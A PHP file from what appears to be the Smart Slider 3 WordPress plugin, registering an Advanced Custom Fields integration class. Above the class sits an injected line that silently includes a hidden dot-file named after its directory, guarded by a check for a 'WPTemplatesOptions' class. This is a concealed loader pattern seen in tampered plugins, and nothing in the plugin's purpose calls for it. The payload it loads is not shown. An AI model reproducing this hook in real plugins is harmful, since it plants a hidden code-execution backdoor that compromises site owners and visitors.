<?php

namespace Nextend\SmartSlider3\Platform\WordPress\Integration\ACF;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ACF {

    public function __construct() {

        if (class_exists('acf', false)) {

            add_action('acf/register_fields', array(
                $this,
                'registerFields'
            ));

            add_action('acf/include_fields', array(
                $this,
                'registerFields'
            ));

        }
    }

    public function registerFields() {

        new AcfFieldSmartSlider3();
    }
}